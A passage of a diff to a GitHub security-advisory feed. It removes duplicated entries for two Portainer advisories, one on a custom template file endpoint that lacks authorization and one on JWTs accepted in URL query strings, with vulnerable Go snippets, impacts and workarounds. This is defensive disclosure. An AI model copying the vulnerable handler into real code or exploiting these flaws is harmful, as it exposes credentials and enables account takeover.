+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m675-2p33-xv9g</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-18T13:40:58.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/iskorotkov/avro/v2] iskorotkov/avro: Denial-of-Service Vulnerability in Decoder]]></title>
         <id>https://github.com/advisories/GHSA-mx64-mj3q-7prj</id>
@@ -1012,455 +1367,5 @@ Join #fleet in <a href="https://join.slack.com/t/osquery/shared_invite/zt-h29zm0
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-14T18:25:38.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/portainer/portainer] Portainer missing authorization on custom template file endpoint, which exposes template content]]></title>
-        <id>https://github.com/advisories/GHSA-cqpq-2fgr-8mvc</id>
-        <link href="https://github.com/advisories/GHSA-cqpq-2fgr-8mvc"/>
-        <updated>2026-05-14T16:34:02.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>A missing authorization vulnerability in the Custom Template file endpoint (<code>GET /api/custom_templates/{id}/file</code>) allows any authenticated user to read the file content of any custom template by enumerating sequential integer IDs, bypassing Resource Control access restrictions. Template files may contain environment-specific values such as connection strings, API tokens, or registry credentials that administrators would not expect standard users to read.</p>
-<h2 id="severity">Severity</h2>
-<p><strong>Medium</strong></p>
-<p><strong>CWE-862</strong> — Missing Authorization</p>
-<p>Exploitation requires an authenticated user account and at least one custom template to exist. Template files are returned verbatim and may contain embedded credentials.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<p>The vulnerability exists in every Portainer release since custom templates were introduced — the <code>customTemplateFile</code> handler has never performed an authorization check.</p>
-<p>Fixes are included in the following releases:</p>
-<table>
-<thead>
-<tr>
-<th>Branch</th>
-<th>First vulnerable</th>
-<th>Fixed in</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2.33.x (LTS)</td>
-<td>2.33.0</td>
-<td><strong>2.33.8</strong></td>
-</tr>
-<tr>
-<td>2.39.x (LTS)</td>
-<td>2.39.0</td>
-<td><strong>2.39.1</strong></td>
-</tr>
-</tbody></table>
-<p>Portainer 2.40.0 and later are not affected — the fix was already on <code>develop</code> when the 2.40.x STS line branched. Portainer LTS branches receive fixes for 6 months plus a 3-month overlap after the next LTS ships. All releases <strong>prior to 2.33.0 are end-of-life</strong> and will not receive a fix; users on EOL versions should upgrade to a supported release.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>There is no runtime configuration that blocks the vulnerable endpoint directly. Administrators who cannot immediately upgrade can reduce exposure by:</p>
-<ul>
-<li><strong>Avoiding storing secrets in custom templates</strong> until the patched release is deployed. Move sensitive configuration values to Portainer environment variables or an external secret store.</li>
-<li><strong>Reviewing existing custom templates</strong> for embedded secrets. Assume any secret previously stored in a custom template on an unpatched instance has been exposed to every authenticated user and rotate accordingly.</li>
-</ul>
-<p>Neither replaces the fix.</p>
-<h2 id="affected-code">Affected Code</h2>
-<p>The <code>customTemplateFile</code> handler in <code>api/http/handler/customtemplates/customtemplate_file.go</code> (lines 30-53) retrieves a custom template by its numeric ID and returns the file content without performing any authorization check.</p>
-<p>All other custom template endpoints properly verify access:</p>
-<table>
-<thead>
-<tr>
-<th>Endpoint</th>
-<th>Method</th>
-<th>Authorization Check</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>/api/custom_templates/{id}</code></td>
-<td>GET (inspect)</td>
-<td><code>userCanEditTemplate()</code> + <code>UserCanAccessResource()</code></td>
-</tr>
-<tr>
-<td><code>/api/custom_templates/{id}</code></td>
-<td>PUT (update)</td>
-<td><code>userCanEditTemplate()</code></td>
-</tr>
-<tr>
-<td><code>/api/custom_templates/{id}</code></td>
-<td>DELETE</td>
-<td><code>userCanEditTemplate()</code></td>
-</tr>
-<tr>
-<td><code>/api/custom_templates</code></td>
-<td>GET (list)</td>
-<td><code>FilterAuthorizedCustomTemplates()</code></td>
-</tr>
-<tr>
-<td><strong><code>/api/custom_templates/{id}/file</code></strong></td>
-<td><strong>GET</strong></td>
-<td><strong>None</strong></td>
-</tr>
-</tbody></table>
-<p><strong>Vulnerable code</strong> (<code>customtemplate_file.go:30-53</code>):</p>
-<pre><code class="language-go">func (handler *Handler) customTemplateFile(w http.ResponseWriter, r *http.Request) *httperror.HandlerError {
-    customTemplateID, _ := request.RetrieveNumericRouteVariableValue(r, "id")
-    customTemplate, _ := handler.DataStore.CustomTemplate().Read(portainer.CustomTemplateID(customTemplateID))
-    // NO AUTHORIZATION CHECK
-    fileContent, _ := handler.FileService.GetFileContent(customTemplate.ProjectPath, entryPath)
-    return response.JSON(w, &amp;fileResponse{FileContent: string(fileContent)})
-}
-</code></pre>
-<p><strong>Secure reference</strong> (<code>customtemplate_inspect.go:50-75</code>):</p>
-<pre><code class="language-go">canEdit := userCanEditTemplate(customTemplate, securityContext)
-hasAccess := authorization.UserCanAccessResource(securityContext.UserID, teamIDs, resourceControl)
-if !canEdit &amp;&amp; !hasAccess {
-    return httperror.Forbidden("Access denied to resource", httperrors.ErrResourceAccessDenied)
-}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>Any authenticated user (including the lowest-privilege standard user) can read the file content of every custom template in the instance. Custom templates commonly contain Docker Compose configuration, which may include environment-specific secrets such as database connection strings, API tokens, or registry credentials.</p>
-<h2 id="timeline">Timeline</h2>
-<ul>
-<li>2026-02-11: Reported via GitHub Security Advisory by <strong>duddnr0615k</strong>.</li>
-<li>2026-03-04: Fix merged to <code>develop</code> and cherry-picked to <code>release/2.39</code>.</li>
-<li>2026-03-19: 2.39.1 released with fix.</li>
-<li>2026-03-25: 2.40.0 released with fix already present from branch cut.</li>
-<li>2026-05-07: 2.33.8 released.</li>
-</ul>
-<h2 id="credit">Credit</h2>
-<ul>
-<li><strong>duddnr0615k</strong> — identified and reported the missing authorization check on the custom template file endpoint.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/portainer/portainer/security/advisories/GHSA-cqpq-2fgr-8mvc">https://github.com/portainer/portainer/security/advisories/GHSA-cqpq-2fgr-8mvc</a></li>
-<li><a href="https://github.com/portainer/portainer/releases/tag/2.33.8">https://github.com/portainer/portainer/releases/tag/2.33.8</a></li>
-<li><a href="https://github.com/portainer/portainer/releases/tag/2.39.2">https://github.com/portainer/portainer/releases/tag/2.39.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-cqpq-2fgr-8mvc">https://github.com/advisories/GHSA-cqpq-2fgr-8mvc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cqpq-2fgr-8mvc</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-14T16:34:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/portainer/portainer] Portainer missing authorization on custom template file endpoint, which exposes template content]]></title>
-        <id>https://github.com/advisories/GHSA-cqpq-2fgr-8mvc</id>
-        <link href="https://github.com/advisories/GHSA-cqpq-2fgr-8mvc"/>
-        <updated>2026-05-14T16:34:02.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>A missing authorization vulnerability in the Custom Template file endpoint (<code>GET /api/custom_templates/{id}/file</code>) allows any authenticated user to read the file content of any custom template by enumerating sequential integer IDs, bypassing Resource Control access restrictions. Template files may contain environment-specific values such as connection strings, API tokens, or registry credentials that administrators would not expect standard users to read.</p>
-<h2 id="severity">Severity</h2>
-<p><strong>Medium</strong></p>
-<p><strong>CWE-862</strong> — Missing Authorization</p>
-<p>Exploitation requires an authenticated user account and at least one custom template to exist. Template files are returned verbatim and may contain embedded credentials.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<p>The vulnerability exists in every Portainer release since custom templates were introduced — the <code>customTemplateFile</code> handler has never performed an authorization check.</p>
-<p>Fixes are included in the following releases:</p>
-<table>
-<thead>
-<tr>
-<th>Branch</th>
-<th>First vulnerable</th>
-<th>Fixed in</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2.33.x (LTS)</td>
-<td>2.33.0</td>
-<td><strong>2.33.8</strong></td>
-</tr>
-<tr>
-<td>2.39.x (LTS)</td>
-<td>2.39.0</td>
-<td><strong>2.39.1</strong></td>
-</tr>
-</tbody></table>
-<p>Portainer 2.40.0 and later are not affected — the fix was already on <code>develop</code> when the 2.40.x STS line branched. Portainer LTS branches receive fixes for 6 months plus a 3-month overlap after the next LTS ships. All releases <strong>prior to 2.33.0 are end-of-life</strong> and will not receive a fix; users on EOL versions should upgrade to a supported release.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>There is no runtime configuration that blocks the vulnerable endpoint directly. Administrators who cannot immediately upgrade can reduce exposure by:</p>
-<ul>
-<li><strong>Avoiding storing secrets in custom templates</strong> until the patched release is deployed. Move sensitive configuration values to Portainer environment variables or an external secret store.</li>
-<li><strong>Reviewing existing custom templates</strong> for embedded secrets. Assume any secret previously stored in a custom template on an unpatched instance has been exposed to every authenticated user and rotate accordingly.</li>
-</ul>
-<p>Neither replaces the fix.</p>
-<h2 id="affected-code">Affected Code</h2>
-<p>The <code>customTemplateFile</code> handler in <code>api/http/handler/customtemplates/customtemplate_file.go</code> (lines 30-53) retrieves a custom template by its numeric ID and returns the file content without performing any authorization check.</p>
-<p>All other custom template endpoints properly verify access:</p>
-<table>
-<thead>
-<tr>
-<th>Endpoint</th>
-<th>Method</th>
-<th>Authorization Check</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>/api/custom_templates/{id}</code></td>
-<td>GET (inspect)</td>
-<td><code>userCanEditTemplate()</code> + <code>UserCanAccessResource()</code></td>
-</tr>
-<tr>
-<td><code>/api/custom_templates/{id}</code></td>
-<td>PUT (update)</td>
-<td><code>userCanEditTemplate()</code></td>
-</tr>
-<tr>
-<td><code>/api/custom_templates/{id}</code></td>
-<td>DELETE</td>
-<td><code>userCanEditTemplate()</code></td>
-</tr>
-<tr>
-<td><code>/api/custom_templates</code></td>
-<td>GET (list)</td>
-<td><code>FilterAuthorizedCustomTemplates()</code></td>
-</tr>
-<tr>
-<td><strong><code>/api/custom_templates/{id}/file</code></strong></td>
-<td><strong>GET</strong></td>
-<td><strong>None</strong></td>
-</tr>
-</tbody></table>
-<p><strong>Vulnerable code</strong> (<code>customtemplate_file.go:30-53</code>):</p>
-<pre><code class="language-go">func (handler *Handler) customTemplateFile(w http.ResponseWriter, r *http.Request) *httperror.HandlerError {
-    customTemplateID, _ := request.RetrieveNumericRouteVariableValue(r, "id")
-    customTemplate, _ := handler.DataStore.CustomTemplate().Read(portainer.CustomTemplateID(customTemplateID))
-    // NO AUTHORIZATION CHECK
-    fileContent, _ := handler.FileService.GetFileContent(customTemplate.ProjectPath, entryPath)
-    return response.JSON(w, &amp;fileResponse{FileContent: string(fileContent)})
-}
-</code></pre>
-<p><strong>Secure reference</strong> (<code>customtemplate_inspect.go:50-75</code>):</p>
-<pre><code class="language-go">canEdit := userCanEditTemplate(customTemplate, securityContext)
-hasAccess := authorization.UserCanAccessResource(securityContext.UserID, teamIDs, resourceControl)
-if !canEdit &amp;&amp; !hasAccess {
-    return httperror.Forbidden("Access denied to resource", httperrors.ErrResourceAccessDenied)
-}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>Any authenticated user (including the lowest-privilege standard user) can read the file content of every custom template in the instance. Custom templates commonly contain Docker Compose configuration, which may include environment-specific secrets such as database connection strings, API tokens, or registry credentials.</p>
-<h2 id="timeline">Timeline</h2>
-<ul>
-<li>2026-02-11: Reported via GitHub Security Advisory by <strong>duddnr0615k</strong>.</li>
-<li>2026-03-04: Fix merged to <code>develop</code> and cherry-picked to <code>release/2.39</code>.</li>
-<li>2026-03-19: 2.39.1 released with fix.</li>
-<li>2026-03-25: 2.40.0 released with fix already present from branch cut.</li>
-<li>2026-05-07: 2.33.8 released.</li>
-</ul>
-<h2 id="credit">Credit</h2>
-<ul>
-<li><strong>duddnr0615k</strong> — identified and reported the missing authorization check on the custom template file endpoint.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/portainer/portainer/security/advisories/GHSA-cqpq-2fgr-8mvc">https://github.com/portainer/portainer/security/advisories/GHSA-cqpq-2fgr-8mvc</a></li>
-<li><a href="https://github.com/portainer/portainer/releases/tag/2.33.8">https://github.com/portainer/portainer/releases/tag/2.33.8</a></li>
-<li><a href="https://github.com/portainer/portainer/releases/tag/2.39.2">https://github.com/portainer/portainer/releases/tag/2.39.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-cqpq-2fgr-8mvc">https://github.com/advisories/GHSA-cqpq-2fgr-8mvc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cqpq-2fgr-8mvc</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-14T16:34:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/portainer/portainer] Portainer: JWT accepted in URL query leaks tokens to logs and referers]]></title>
-        <id>https://github.com/advisories/GHSA-jvp4-q659-95mj</id>
-        <link href="https://github.com/advisories/GHSA-jvp4-q659-95mj"/>
-        <updated>2026-05-14T16:33:51.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Portainer's authentication middleware accepts JWT bearer tokens passed as the <code>?token=&lt;JWT&gt;</code> URL query parameter on any authenticated API endpoint, in addition to the standard <code>Authorization: Bearer</code> header. URLs are recorded in reverse-proxy access logs, browser history, and HTTP <code>Referer</code> headers on outbound navigation, so any JWT passed this way can be harvested by anyone with access to those logs or by an external site the user subsequently visits. A leaked token grants the full privileges of the user it was issued to, until the token expires (default 8 hours, configurable).</p>
-<p>The <code>?token=</code> parameter was used by Portainer's browser-based container attach, exec, and pod shell features, so any user with exec or attach rights on a container was exposed — not only administrators.</p>
-<h2 id="severity">Severity</h2>
-<p><strong>High</strong></p>
-<p>Attack complexity is High because exploitation depends on the attacker obtaining a leaked token from a log, referer, or shared URL. Once obtained, a leaked token grants the privileges of the user it was issued to; for administrator tokens this compromises confidentiality, integrity, and availability of Portainer itself and of every Docker/Kubernetes environment it manages — container exec and stack deployment make host-level compromise reachable, so subsequent-system impact is also High.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<p>Query-parameter token acceptance has existed since JWT authentication was introduced in Portainer.</p>
-<p>Fixes are included in the following releases:</p>
-<table>
-<thead>
-<tr>
-<th>Branch</th>
-<th>First vulnerable</th>
-<th>Fixed in</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2.33.x (LTS)</td>
-<td>2.33.0</td>
-<td><strong>2.33.8</strong></td>
-</tr>
-<tr>
-<td>2.39.x (LTS)</td>
-<td>2.39.0</td>
-<td><strong>2.39.2</strong></td>
-</tr>
-<tr>
-<td>2.40.x (STS)</td>
-<td>all prior</td>
-<td><strong>2.41.0</strong></td>
-</tr>
-</tbody></table>
-<p>Portainer releases prior to 2.33.0 are end-of-life and will not receive a fix. Users on EOL versions should upgrade to a supported LTS branch.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Administrators who cannot immediately upgrade can reduce exposure by:</p>
-<ul>
-<li><strong>Stripping <code>?token=</code> at the reverse proxy.</strong> A rewrite rule in nginx, Traefik, or equivalent that removes the <code>token</code> query parameter before the request reaches Portainer blocks the query-parameter auth path entirely. Container exec and interactive shells rely on the query-parameter token for WebSocket upgrade and will stop working until the patched release is deployed.</li>
-<li><strong>Auditing existing logs.</strong> Search reverse-proxy access logs and application logs for <code>?token=</code> or <code>&amp;token=</code> occurrences and treat any captured JWT as compromised. Resetting the affected user's password invalidates their sessions; reducing the JWT session timeout in Portainer settings shortens the exposure window for tokens already issued.</li>
-<li><strong>Administrator hygiene.</strong> Do not share Portainer URLs that contain <code>?token=</code> in chat, email, or tickets, and avoid navigating to external sites from within the Portainer UI on unpatched instances — the <code>Referer</code> header will carry the token.</li>
-</ul>
-<p>None of these replace the fix.</p>
-<h2 id="affected-code">Affected Code</h2>
-<p>Pre-fix, <code>extractBearerToken</code> in <code>api/http/security/bouncer.go</code> read the JWT from the <code>token</code> query parameter before falling back to the <code>Authorization</code> header. The <code>query.Del("token")</code> call scrubs the parameter from <code>r.URL.RawQuery</code> on the way through Portainer, but by that point the original URL has already been recorded by any upstream reverse proxy, access logger, or browser.</p>
-<pre><code class="language-go">func extractBearerToken(r *http.Request) (string, bool) {
-    query := r.URL.Query()
-    token := query.Get("token")
-    if token != "" {
-        query.Del("token")
-        r.URL.RawQuery = query.Encode()
-        return token, true
-    }
-
-    tokens, ok := r.Header[jwtTokenHeader]
-    if !ok || len(tokens) == 0 {
-        return "", false
-    }
-    // ...
-}
-</code></pre>
-<p>The fix removes the query-parameter path entirely. Authenticated requests now carry the JWT via the <code>Authorization</code> header for API clients, or via the <code>portainer_api_key</code> HttpOnly cookie for the browser UI — cookies are sent automatically on same-origin WebSocket upgrade requests, so the browser-based container attach, exec, and pod shell features continue to work without exposing the token in the URL. The WebSocket handlers that previously documented <code>?token=</code> as a required query parameter have been updated to match.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Token leakage to infrastructure.</strong> Intermediate systems that observe the request URL — reverse proxies, load balancers, access logs, WAFs, and corporate network monitoring — capture the full JWT in plaintext.</li>
-<li><strong>Token leakage via the browser.</strong> URLs containing <code>?token=</code> are recorded in browser history and forwarded in the <code>Referer</code> header on any outbound navigation from the Portainer UI.</li>
-<li><strong>Account takeover.</strong> Anyone with access to a leaked JWT acts as the authenticated user for the remainder of the token's validity, without needing the password. If the leaked token belongs to an administrator, the attacker gains full API access including user management, container exec, and stack deployment.</li>
-<li><strong>Reach beyond Portainer.</strong> Container exec with an administrator JWT reaches the host filesystem of managed environments and can be used to execute commands on those hosts.</li>
-</ul>
-<h2 id="timeline">Timeline</h2>
-<ul>
-<li>2026-03-06: Reported via GitHub Security Advisory by <strong>scanpwn</strong>.</li>
-<li>2026-04-14: Fix merged to <code>develop</code>.</li>
-<li>2026-04-29: 2.41.0 released.</li>
-<li>2026-05-07: 2.39.2-LTS and 2.33.8-LTS released.</li>
-</ul>
-<h2 id="credit">Credit</h2>
-<ul>
-<li><strong>scanpwn</strong> — identified and reported the query-parameter JWT acceptance and the resulting token-leakage vectors.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/portainer/portainer/security/advisories/GHSA-jvp4-q659-95mj">https://github.com/portainer/portainer/security/advisories/GHSA-jvp4-q659-95mj</a></li>
-<li><a href="https://github.com/portainer/portainer/releases/tag/2.33.8">https://github.com/portainer/portainer/releases/tag/2.33.8</a></li>
-<li><a href="https://github.com/portainer/portainer/releases/tag/2.39.2">https://github.com/portainer/portainer/releases/tag/2.39.2</a></li>
-<li><a href="https://github.com/portainer/portainer/releases/tag/2.41.0">https://github.com/portainer/portainer/releases/tag/2.41.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-jvp4-q659-95mj">https://github.com/advisories/GHSA-jvp4-q659-95mj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jvp4-q659-95mj</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-14T16:33:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/portainer/portainer] Portainer: JWT accepted in URL query leaks tokens to logs and referers]]></title>
-        <id>https://github.com/advisories/GHSA-jvp4-q659-95mj</id>
-        <link href="https://github.com/advisories/GHSA-jvp4-q659-95mj"/>
-        <updated>2026-05-14T16:33:51.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Portainer's authentication middleware accepts JWT bearer tokens passed as the <code>?token=&lt;JWT&gt;</code> URL query parameter on any authenticated API endpoint, in addition to the standard <code>Authorization: Bearer</code> header. URLs are recorded in reverse-proxy access logs, browser history, and HTTP <code>Referer</code> headers on outbound navigation, so any JWT passed this way can be harvested by anyone with access to those logs or by an external site the user subsequently visits. A leaked token grants the full privileges of the user it was issued to, until the token expires (default 8 hours, configurable).</p>
-<p>The <code>?token=</code> parameter was used by Portainer's browser-based container attach, exec, and pod shell features, so any user with exec or attach rights on a container was exposed — not only administrators.</p>
-<h2 id="severity">Severity</h2>
-<p><strong>High</strong></p>
-<p>Attack complexity is High because exploitation depends on the attacker obtaining a leaked token from a log, referer, or shared URL. Once obtained, a leaked token grants the privileges of the user it was issued to; for administrator tokens this compromises confidentiality, integrity, and availability of Portainer itself and of every Docker/Kubernetes environment it manages — container exec and stack deployment make host-level compromise reachable, so subsequent-system impact is also High.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<p>Query-parameter token acceptance has existed since JWT authentication was introduced in Portainer.</p>
-<p>Fixes are included in the following releases:</p>
-<table>
-<thead>
-<tr>
-<th>Branch</th>
-<th>First vulnerable</th>
-<th>Fixed in</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>2.33.x (LTS)</td>
-<td>2.33.0</td>
-<td><strong>2.33.8</strong></td>
-</tr>
-<tr>
-<td>2.39.x (LTS)</td>
-<td>2.39.0</td>
-<td><strong>2.39.2</strong></td>
-</tr>
-<tr>
-<td>2.40.x (STS)</td>
-<td>all prior</td>
-<td><strong>2.41.0</strong></td>
-</tr>
-</tbody></table>
-<p>Portainer releases prior to 2.33.0 are end-of-life and will not receive a fix. Users on EOL versions should upgrade to a supported LTS branch.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Administrators who cannot immediately upgrade can reduce exposure by:</p>
-<ul>
-<li><strong>Stripping <code>?token=</code> at the reverse proxy.</strong> A rewrite rule in nginx, Traefik, or equivalent that removes the <code>token</code> query parameter before the request reaches Portainer blocks the query-parameter auth path entirely. Container exec and interactive shells rely on the query-parameter token for WebSocket upgrade and will stop working until the patched release is deployed.</li>
-<li><strong>Auditing existing logs.</strong> Search reverse-proxy access logs and application logs for <code>?token=</code> or <code>&amp;token=</code> occurrences and treat any captured JWT as compromised. Resetting the affected user's password invalidates their sessions; reducing the JWT session timeout in Portainer settings shortens the exposure window for tokens already issued.</li>
-<li><strong>Administrator hygiene.</strong> Do not share Portainer URLs that contain <code>?token=</code> in chat, email, or tickets, and avoid navigating to external sites from within the Portainer UI on unpatched instances — the <code>Referer</code> header will carry the token.</li>
-</ul>
-<p>None of these replace the fix.</p>
-<h2 id="affected-code">Affected Code</h2>
-<p>Pre-fix, <code>extractBearerToken</code> in <code>api/http/security/bouncer.go</code> read the JWT from the <code>token</code> query parameter before falling back to the <code>Authorization</code> header. The <code>query.Del("token")</code> call scrubs the parameter from <code>r.URL.RawQuery</code> on the way through Portainer, but by that point the original URL has already been recorded by any upstream reverse proxy, access logger, or browser.</p>
-<pre><code class="language-go">func extractBearerToken(r *http.Request) (string, bool) {
-    query := r.URL.Query()
-    token := query.Get("token")
-    if token != "" {
-        query.Del("token")
-        r.URL.RawQuery = query.Encode()
-        return token, true
-    }
-
-    tokens, ok := r.Header[jwtTokenHeader]
-    if !ok || len(tokens) == 0 {
-        return "", false
-    }
-    // ...
-}
-</code></pre>
-<p>The fix removes the query-parameter path entirely. Authenticated requests now carry the JWT via the <code>Authorization</code> header for API clients, or via the <code>portainer_api_key</code> HttpOnly cookie for the browser UI — cookies are sent automatically on same-origin WebSocket upgrade requests, so the browser-based container attach, exec, and pod shell features continue to work without exposing the token in the URL. The WebSocket handlers that previously documented <code>?token=</code> as a required query parameter have been updated to match.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Token leakage to infrastructure.</strong> Intermediate systems that observe the request URL — reverse proxies, load balancers, access logs, WAFs, and corporate network monitoring — capture the full JWT in plaintext.</li>
-<li><strong>Token leakage via the browser.</strong> URLs containing <code>?token=</code> are recorded in browser history and forwarded in the <code>Referer</code> header on any outbound navigation from the Portainer UI.</li>
-<li><strong>Account takeover.</strong> Anyone with access to a leaked JWT acts as the authenticated user for the remainder of the token's validity, without needing the password. If the leaked token belongs to an administrator, the attacker gains full API access including user management, container exec, and stack deployment.</li>
-<li><strong>Reach beyond Portainer.</strong> Container exec with an administrator JWT reaches the host filesystem of managed environments and can be used to execute commands on those hosts.</li>
-</ul>
-<h2 id="timeline">Timeline</h2>
-<ul>
-<li>2026-03-06: Reported via GitHub Security Advisory by <strong>scanpwn</strong>.</li>
-<li>2026-04-14: Fix merged to <code>develop</code>.</li>
-<li>2026-04-29: 2.41.0 released.</li>
-<li>2026-05-07: 2.39.2-LTS and 2.33.8-LTS released.</li>
-</ul>
-<h2 id="credit">Credit</h2>
-<ul>
-<li><strong>scanpwn</strong> — identified and reported the query-parameter JWT acceptance and the resulting token-leakage vectors.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/portainer/portainer/security/advisories/GHSA-jvp4-q659-95mj">https://github.com/portainer/portainer/security/advisories/GHSA-jvp4-q659-95mj</a></li>
-<li><a href="https://github.com/portainer/portainer/releases/tag/2.33.8">https://github.com/portainer/portainer/releases/tag/2.33.8</a></li>
-<li><a href="https://github.com/portainer/portainer/releases/tag/2.39.2">https://github.com/portainer/portainer/releases/tag/2.39.2</a></li>
-<li><a href="https://github.com/portainer/portainer/releases/tag/2.41.0">https://github.com/portainer/portainer/releases/tag/2.41.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-jvp4-q659-95mj">https://github.com/advisories/GHSA-jvp4-q659-95mj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jvp4-q659-95mj</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-14T16:33:48.000Z</published>
     </entry>
 </feed>
